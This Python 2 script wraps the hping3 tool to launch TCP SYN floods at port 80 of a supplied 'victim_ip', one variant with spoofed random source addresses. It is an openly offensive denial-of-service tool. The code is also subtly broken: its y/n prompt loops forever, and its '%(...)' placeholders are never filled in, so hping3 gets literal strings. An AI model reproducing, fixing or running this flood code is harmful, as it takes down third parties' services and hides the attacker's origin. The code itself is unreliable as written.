from subprocess import call
from random import randint

def verbose_mode():
    verbose = str(raw_input('Would you like verbose mode? (y/n): '))
    while ((verbose != "y") or (verbose != 'n')):
        verbose = str(raw_input('Would you like verbose mode? (y/n): '))
    return verbose

def random_data_size():
    return randint(940, 1200)

def random_ttl_size():
    return randint(2, 256)

def launch_attack():
    verbose_mode()

def launch_nonrandom_flood(victim_ip):
    process = call(["hping3", "--verbose", "--syn", "--flood", "--win", "65535", "--ttl",
                    "%(random_ttl_size())", "--data", "%(random_data_size())",
                    "--dontfrag", "--baseport", "%(randint(49152, 65535))", "--destport", "80",
                    "%(victim_ip)"])
    return process

def launch_random_flood(victim_ip):
    process = call(["hping3", "--verbose", "--syn", "--flood", "--rand-source", "--win",
                    "%(randint(3, 225))", "--data", "%(randint(940, 1200))", "--dontfrag",
                    "--baseport", "%(randint(49152, 65535))", "--destport", "80", "%(victim_ip)"])
    return process
